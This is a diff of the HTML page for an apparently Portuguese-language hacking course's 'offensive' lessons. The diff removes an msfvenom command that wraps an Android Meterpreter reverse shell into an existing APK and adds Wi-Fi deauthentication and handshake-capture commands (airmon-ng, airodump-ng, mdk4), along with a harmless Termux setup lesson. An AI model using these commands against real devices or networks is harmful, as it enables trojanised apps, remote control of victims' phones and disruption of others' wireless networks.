@@ -3,23 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RED TEAM OPERATIONS</title>
+    <title>CYBER ACADEMY - OFFENSIVE MODULE</title>
     <style>
-        :root { --bg-corporate: #040711; --bg-surface: #0a1122; --bg-terminal: #02040a; --accent-red: #ef4444; --accent-cyan: #06b6d4; --text-main: #f8fafc; --text-secondary: #94a3b8; }
+        :root {
+            --bg-main: #060913;
+            --bg-card: #0b1220;
+            --bg-terminal: #020408;
+            --accent-magenta: #ff007f;
+            --accent-blue: #00d2ff;
+            --text-title: #ffffff;
+            --text-desc: #94a3b8;
+            --border-color: rgba(255, 255, 255, 0.05);
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background-color: var(--bg-corporate); color: var(--text-main); padding: 15px; }
-        .nav-back { color: var(--accent-cyan); text-decoration: none; font-family: monospace; display: block; margin-bottom: 20px; font-weight: bold; }
-        .panel { background: var(--bg-surface); border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; padding: 20px; margin-bottom: 15px; }
-        .title { border-left: 4px solid var(--accent-red); padding-left: 10px; font-size: 1.2rem; text-transform: uppercase; margin-bottom: 15px; }
-        .code { background: var(--bg-terminal); padding: 12px; border-radius: 6px; font-family: monospace; color: #ff7b72; margin-top: 10px; overflow-x: auto; white-space: pre-wrap; }
+        body { background-color: var(--bg-main); color: #ffffff; padding: 15px; line-height: 1.5; }
+        .nav-back { color: var(--accent-blue); text-decoration: none; font-family: monospace; display: inline-block; margin-bottom: 20px; font-weight: bold; font-size: 0.85rem; }
+        .section-title { font-size: 1.1rem; font-weight: 700; text-transform: uppercase; margin-bottom: 20px; color: #ffffff; border-left: 4px solid var(--accent-magenta); padding-left: 12px; }
+        .lesson-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 22px; margin-bottom: 20px; }
+        .lesson-card h3 { font-size: 1.1rem; color: #ffffff; margin-bottom: 8px; }
+        .lesson-card p { color: var(--text-desc); font-size: 0.85rem; margin-bottom: 12px; }
+        .terminal-block { background: var(--bg-terminal); border: 1px solid rgba(255,255,255,0.02); border-radius: 6px; padding: 12px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #ff7b72; border-left: 3px solid var(--accent-magenta); overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
     </style>
 </head>
 <body>
-    <a href="index.html" class="nav-back">← RETORNAR AO PANEL PRINCIPAL</a>
-    <div class="panel">
-        <h2 class="title">Módulo 01 // Red Team Operations</h2>
-        <p style="color: var(--text-secondary); font-size: 0.9rem;">Manuais avançados de simulação de adversários e táticas de intrusão perimetral.</p>
-        <div class="code"># Simulação de Engenharia Reversa em APKs móveis&#10;msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o audit.apk</div>
+
+    <a href="index.html" class="nav-back">← RETORNAR À ÁRVORE DE CURSOS</a>
+    <h2 class="section-title">Aulas Técnicas // Trilha Ofensiva</h2>
+
+    <div class="lesson-card">
+        <h3>Aula 1: Auditoria Wireless e Captura de Handshake</h3>
+        <p>Como grupos hacker reais operam placas em modo monitor e disparam frames Deauth para quebrar criptografias de senhas.</p>
+        <div class="terminal-block">sudo airmon-ng start wlan0&#10;sudo airodump-ng --bssid [MAC_ROUTER] -c [CH] -w log wlan0mon&#10;sudo mdk4 wlan0mon d -b alvos.txt</div>
     </div>
+
+    <div class="lesson-card">
+        <h3>Aula 2: Engenharia de Terminal no Termux Linux</h3>
+        <p>Configuração de infraestruturas estáveis de rede móvel e geração de pares de chaves criptográficas RSA seguras.</p>
+        <div class="terminal-block">pkg update && pkg upgrade -y&#10;pkg install openssh python git nmap -y&#10;ssh-keygen -t rsa -b 4096</div>
+    </div>
+
 </body>
 </html>
